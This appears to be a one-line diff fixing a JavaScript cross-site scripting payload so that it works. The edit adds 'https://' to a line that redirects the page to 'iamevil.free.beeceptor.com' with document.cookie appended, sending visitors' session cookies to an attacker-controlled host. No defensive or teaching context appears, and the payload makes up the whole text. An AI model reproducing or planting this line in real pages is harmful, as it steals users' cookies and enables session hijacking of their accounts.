@@ -1,1 +1,1 @@
-document.location = 'iamevil.free.beeceptor.com/cookie?c=' + document.cookie;
+document.location = 'https://iamevil.free.beeceptor.com/cookie?c=' + document.cookie;
